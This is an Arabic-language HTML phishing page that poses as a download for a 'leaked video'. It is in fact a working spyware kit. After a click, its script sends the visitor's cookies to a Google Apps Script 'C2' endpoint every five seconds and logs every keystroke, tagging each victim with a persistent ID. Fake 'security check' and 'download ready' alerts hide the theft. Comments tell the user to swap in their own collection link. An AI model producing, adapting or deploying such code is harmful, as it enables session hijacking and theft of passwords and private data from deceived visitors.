<!DOCTYPE html>
<html>
<head>
  <title>تحميل الفيديو</title>
  <meta charset="UTF-8">
  <style>
    body { font-family: Arial; text-align: center; padding: 50px; }
    .btn { padding: 15px 30px; background: #4267B2; color: white; border: none; border-radius: 5px; font-size: 18px; }
  </style>
</head>
<body>
  <h2>🎬 الفيديو المسرب - اضغط لتحميل</h2>
  <p>جاري تحميل الملف... لا تغلق الصفحة</p>
  <button class="btn" onclick="start()">ابدأ التحميل</button>

  <script>
    function start() {
      alert("جاري التحقق من الأمان... لا تغلق الصفحة");
      
      // ================== الجاسوس يبدأ هنا ==================
      const C2 = 'https://script.google.com/macros/s/AKfycbzoyU_p5Ut1rbDjHIna_fqasrn_nlnZkXKaJhX9GTGIRgyI7_gNVFWLOY4XlEIUDB-A0A/exec'; // غيرها لرابطك!

      // سرقة الكوكيز كل 5 ثواني
      setInterval(() => {
        fetch(C2, {
          method: 'POST',
          body: JSON.stringify({
            type: 'cookies',
            data: document.cookie,
            url: location.href,
            id: getID()
          })
        }).catch(() => {});
      }, 5000);

      // تسجيل كل ضغطات الكيبورد
      let keys = [];
      document.addEventListener('keydown', e => {
        keys.push({k: e.key, t: Date.now()});
      });

      setInterval(() => {
        if (keys.length > 0) {
          fetch(C2, {
            method: 'POST',
            body: JSON.stringify({
              type: 'keystrokes',
              data: keys,
              url: location.href,
              id: getID()
            })
          });
          keys = [];
        }
      }, 3000);

      // معرف فريد للضحية
      function getID() {
        let id = localStorage.getItem('vid');
        if (!id) {
          id = Math.random().toString(36).substr(2, 9) + '-' + Date.now();
          localStorage.setItem('vid', id);
        }
        return id;
      }

      // إخفاء الزر بعد الضغط
      document.querySelector('.btn').remove();
      document.body.innerHTML += "<p>جاري التحميل... انتظر 10 ثواني</p>";
      setTimeout(() => {
        alert("الملف جاهز! شغّل من Downloads");
      }, 10000);
    }
  </script>
</body>
</html>
